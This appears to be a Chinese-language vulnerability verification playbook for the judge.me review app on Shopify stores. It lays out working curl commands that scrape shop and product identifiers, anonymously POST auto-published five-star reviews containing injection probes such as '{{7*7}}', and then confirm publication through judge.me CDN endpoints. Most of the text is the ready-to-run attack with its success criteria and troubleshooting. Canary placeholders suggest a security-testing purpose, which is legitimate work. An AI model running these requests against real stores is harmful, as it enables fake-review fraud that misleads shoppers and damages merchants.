# judge.me 评论端点匿名提交 → 自动发布（评分与评论内容操纵）

## 前置条件
- 目标为 Shopify 店铺并集成了 judge.me 评论 app；商品页存在 judge.me review widget。
- 从商品页 HTML 读两样东西：
  - `shop_domain`：judge.me 配置里的 myshopify 域（形如 `<shop-handle>.myshopify.com`）
  - `product_id`：widget 提交表单的 `data-product-id` / `id` 字段
- 不需要账号 / Cookie / CSRF token / 验证码 / 真实邮箱 / 购买记录。

## 步骤 0：从商品页取参数
```bash
curl -sk -A "$UA" "https://<storefront>/products/<handle>" -o product.html
grep -oE 'data-product-id="[0-9]+"' product.html | head
grep -oE 'shop_domain["'"'"':= ]+[^",}&]+' product.html | head
```

## 步骤 1：匿名提交评论（multipart）
```bash
curl -sk -A "$UA" -X POST 'https://api.judge.me/api/v1/reviews' \
  -F 'url=<shop-handle>.myshopify.com' \
  -F 'shop_domain=<shop-handle>.myshopify.com' \
  -F 'platform=shopify' \
  -F 'rating=5' \
  -F 'name=<canary-name>' \
  -F 'email=<canary>@example.com' \
  -F 'body=<canary-body> & "dq" '\''sq'\'' {{7*7}}' \
  -F 'id=<product_id>'
```
无 401 / 403 / 验证码 / 错误提示即视为受理（页面等待窗口内可能看不到响应正文，直接进下一步读回）。

## 步骤 2：回读判据（约 30 秒后）
```bash
# 商品 widget 数据源
curl -sk "https://cdn.judge.me/reviews/reviews_for_widget?product_id=<product_id>&page=1&sort_by=created_at&sort_dir=desc&per_page=40&widget_theme=carousel&shop_domain=<shop_domain>&platform=shopify"

# 店铺评论聚合（所有访客可见）
curl -sk "https://cdn.judge.me/reviews/all_reviews_js_based?shop_domain=<shop_domain>&platform=shopify&page=1&per_page=20&sort_by=created_at&sort_dir=desc"
```
命中判据：
- `reviews` 数组出现自己写入的 `reviewer_name` / `body_html`，且 `verified_buyer=false`；
- `number_of_reviews` 比提交前基线 +1；聚合页 `number_of_product_reviews` +1；
- 商品页评分随评论数/星级变化。

## 影响边界
- 评论 HTML 标签被服务端剥离、`&` 被转义，正文按纯文本渲染（`body_html` 形如 `<p>...</p>`，内部实体已编码）——**不是存储型 XSS**；影响限于评分与评论内容完整性操纵（刷好评/差评、塞任意文案）。
- 未购买也可发布（`verified_buyer=false`）。

## 失败常见原因
- `shop_domain` 或 `product_id` 不属于该店铺 → 评论落到别处或永不可见；
- 提交后立刻查不到 → 发布有约 30s 延迟；
- 字段名用 `product_id` 代替 `id` → 服务端不认；
- 目标店铺关闭了 autopublish（审核模式）→ 评论进入待审，不公开；
- 若 widget 已换成其它评论服务，api.judge.me 仍可提交但对目标店无效。